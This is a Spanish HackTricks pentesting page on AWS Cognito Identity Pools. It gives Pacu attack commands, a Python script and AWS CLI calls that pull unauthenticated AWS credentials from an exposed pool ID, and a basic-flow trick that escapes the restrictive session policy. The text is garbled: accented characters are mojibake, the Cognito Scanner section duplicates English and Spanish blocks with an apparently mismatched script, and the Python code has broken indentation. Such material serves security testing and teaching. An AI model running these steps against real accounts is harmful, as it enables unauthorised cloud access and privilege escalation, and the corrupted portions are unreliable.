# Pools de Identidad de Cognito

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop).
* Obt茅n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## Informaci贸n b谩sica

Con un pool de identidad, tus usuarios pueden **obtener credenciales temporales de AWS para acceder a los servicios de AWS**, como Amazon S3 y DynamoDB. Los pools de identidad admiten usuarios invitados an贸nimos, as铆 como los siguientes proveedores de identidad que puedes utilizar para autenticar usuarios en los pools de identidad:

* Pools de usuarios de Amazon Cognito
* Inicio de sesi贸n social con Facebook, Google, Inicio de sesi贸n con Amazon y Inicio de sesi贸n con Apple
* Proveedores de OpenID Connect (OIDC)
* Proveedores de identidad SAML
* Identidades autenticadas por desarrollador

### Cognito Sync

Para generar sesiones de Pool de Identidad, primero necesitas **generar un ID de Identidad**. Este ID de Identidad es la **identificaci贸n de la sesi贸n de ese usuario**. Estas identificaciones pueden tener hasta 20 conjuntos de datos que pueden almacenar hasta 1 MB de pares clave-valor.

Esto es **煤til para mantener informaci贸n de un usuario** (que siempre estar谩 utilizando el mismo ID de Identidad).

Adem谩s, el servicio **cognito-sync** es el servicio que permite **administrar y sincronizar esta informaci贸n** (en los conjuntos de datos, enviando informaci贸n en flujos y mensajes SNS...).

### M贸dulos Pacu para pentesting y enumeraci贸n

[Pacu](https://github.com/RhinoSecurityLabs/pacu), el marco de explotaci贸n de AWS, ahora incluye los m贸dulos "cognito__enum" y "cognito__attack" que automatizan la enumeraci贸n de todos los activos de Cognito en una cuenta y detectan configuraciones d茅biles, atributos de usuario utilizados para el control de acceso, etc., y tambi茅n automatizan la creaci贸n de usuarios (incluido el soporte de MFA) y la escalada de privilegios basada en atributos personalizados modificables, credenciales de pool de identidad utilizables, roles asumibles en tokens de identidad, etc.

Para obtener una descripci贸n de las funciones de los m贸dulos, consulta la parte 2 de la [publicaci贸n del blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para obtener instrucciones de instalaci贸n, consulta la p谩gina principal de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

### Uso

Uso de muestra de cognito__attack para intentar la creaci贸n de usuarios y todos los vectores de escalada de privilegios contra un pool de identidad y un cliente de pool de usuarios espec铆ficos:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Uso de ejemplo de cognito__enum para recopilar todas las piscinas de usuarios, clientes de piscinas de usuarios, piscinas de identidad, usuarios, etc. visibles en la cuenta actual de AWS:

```bash
cognito__enum --all
```

Este comando ejecutar谩 una enumeraci贸n exhaustiva de todos los recursos relacionados con Cognito en la cuenta de AWS actual. Proporcionar谩 informaci贸n detallada sobre las piscinas de usuarios, los clientes de piscinas de usuarios, las piscinas de identidad y los usuarios asociados a ellos. Esto es 煤til para obtener una visi贸n general completa de la configuraci贸n de Cognito en la cuenta de AWS y detectar posibles problemas de seguridad o configuraciones incorrectas.
```bash
Pacu (new:test) > run cognito__enum
```
### Herramienta para pentesting

[Cognito Scanner](https://github.com/padok-team/cognito-scanner) es una herramienta de l铆nea de comandos en Python que implementa diferentes ataques en Cognito, incluyendo la creaci贸n no deseada de cuentas y la escalada de identidad en el grupo de identidades.

#### Instalaci贸n
```bash
$ pip install cognito-scanner
```
#### Uso

#### Enumerate Identity Pools

#### Enumerar Pools de Identidad

The `cognito-identity-pools` module is used to enumerate identity pools in AWS Cognito. It leverages the AWS SDK for Python (Boto3) to interact with the AWS Cognito service.

El m贸dulo `cognito-identity-pools` se utiliza para enumerar pools de identidad en AWS Cognito. Utiliza el SDK de AWS para Python (Boto3) para interactuar con el servicio AWS Cognito.

##### Enumerate Identity Pools Usage

##### Uso de Enumeraci贸n de Pools de Identidad

```
python3 aws_cognito_identity_pools.py --access-key <AWS_ACCESS_KEY> --secret-key <AWS_SECRET_KEY> --region <AWS_REGION>
```

```
python3 aws_cognito_identity_pools.py --access-key <AWS_ACCESS_KEY> --secret-key <AWS_SECRET_KEY> --region <AWS_REGION>
```

##### Required Parameters

##### Par谩metros Requeridos

- `--access-key` : AWS access key with permissions to interact with AWS Cognito.
- `--secret-key` : AWS secret key corresponding to the access key.
- `--region` : AWS region where the identity pools are located.

- `--access-key` : Clave de acceso de AWS con permisos para interactuar con AWS Cognito.
- `--secret-key` : Clave secreta de AWS correspondiente a la clave de acceso.
- `--region` : Regi贸n de AWS donde se encuentran los pools de identidad.

##### Example

##### Ejemplo

```
python3 aws_cognito_identity_pools.py --access-key ABCDEFGHIJKLMNOPQRST --secret-key 1234567890ABCDEFGHIJKLMN --region us-west-2
```

```
python3 aws_cognito_identity_pools.py --access-key ABCDEFGHIJKLMNOPQRST --secret-key 1234567890ABCDEFGHIJKLMN --region us-west-2
```
```bash
$ cognito-scanner --help
```
Para obtener credenciales de AWS en una aplicaci贸n Cognito como usuario no autenticado, el atacante solo necesita conocer el ID del grupo de identidades, y este ID debe estar codificado en la aplicaci贸n web/m贸vil para que se pueda utilizar. Un ID tiene el siguiente formato: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (no se puede obtener por fuerza bruta).

{% hint style="success" %}
El rol no autenticado de IAM Cognito creado a trav茅s de la consola se llama por defecto `Cognito_<Nombre del grupo de identidades>Unauth_Role`
{% endhint %}

Si encuentras un ID de grupo de identidades codificado y permite el acceso de usuarios no autenticados, puedes obtener credenciales de AWS con:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
O tambi茅n puedes usar los siguientes comandos **aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Ten en cuenta que de forma predeterminada, un usuario de Cognito sin autenticar NO TIENE ning煤n permiso, incluso si se le asign贸 mediante una pol铆tica. Verifica la siguiente secci贸n.
{% endhint %}

### Flujo de autenticaci贸n mejorado vs b谩sico

La secci贸n anterior sigui贸 el **flujo de autenticaci贸n mejorado predeterminado**. Este flujo establece una **pol铆tica de sesi贸n restrictiva** para la sesi贸n del rol IAM generada. Esta pol铆tica solo permitir谩 que la sesi贸n [**use los servicios de esta lista**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (incluso si el rol ten铆a acceso a otros servicios).

Sin embargo, hay una forma de evitar esto, si el **grupo de identidades tiene habilitado el "Flujo B谩sico (Cl谩sico)"**, el usuario podr谩 obtener una sesi贸n utilizando ese flujo que **no tendr谩 esa pol铆tica de sesi贸n restrictiva**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si recibes este **error**, es porque el **flujo b谩sico no est谩 habilitado (por defecto)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Teniendo un conjunto de credenciales IAM, debes verificar [a qu茅 acceso tienes](../../#whoami) e intentar [elevar privilegios](../../aws-privilege-escalation/).

### Autenticado

{% hint style="info" %}
Recuerda que los **usuarios autenticados** probablemente tengan **permisos diferentes**, as铆 que si puedes **registrarte dentro de la aplicaci贸n**, intenta hacerlo y obtener las nuevas credenciales.
{% endhint %}

Tambi茅n podr铆a haber **roles** disponibles para **usuarios autenticados que acceden al Identity Pool**.

Para esto, es posible que necesites tener acceso al **proveedor de identidad**. Si ese es un **Cognito User Pool**, tal vez puedas abusar del comportamiento predeterminado y **crear un nuevo usuario t煤 mismo**.

{% hint style="success" %}
El **rol autenticado IAM Cognito creado a trav茅s de** se llama por defecto `Cognito_<Nombre del Identity Pool>Auth_Role`
{% endhint %}

De todos modos, el **siguiente ejemplo** espera que ya hayas iniciado sesi贸n en un **Cognito User Pool** utilizado para acceder al Identity Pool (no olvides que tambi茅n se pueden configurar otros tipos de proveedores de identidad).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Obt茅n el identity_id de la respuesta del comando anterior
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_USER_POOL_ID>=&#x3C;ID_TOKEN>


# En el IdToken puedes encontrar los roles a los que un usuario tiene acceso debido a los grupos del User Pool
# Usa --custom-role-arn para obtener credenciales para un rol espec铆fico
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;TU_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Es posible **configurar diferentes roles IAM dependiendo del proveedor de identidad** con el que el usuario inicie sesi贸n o incluso solo **dependiendo del usuario** (usando claims). Por lo tanto, si tienes acceso a diferentes usuarios a trav茅s del mismo o diferentes proveedores, podr铆a valer la pena **iniciar sesi贸n y acceder a los roles IAM de todos ellos**.
{% endhint %}

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF**, 隆consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
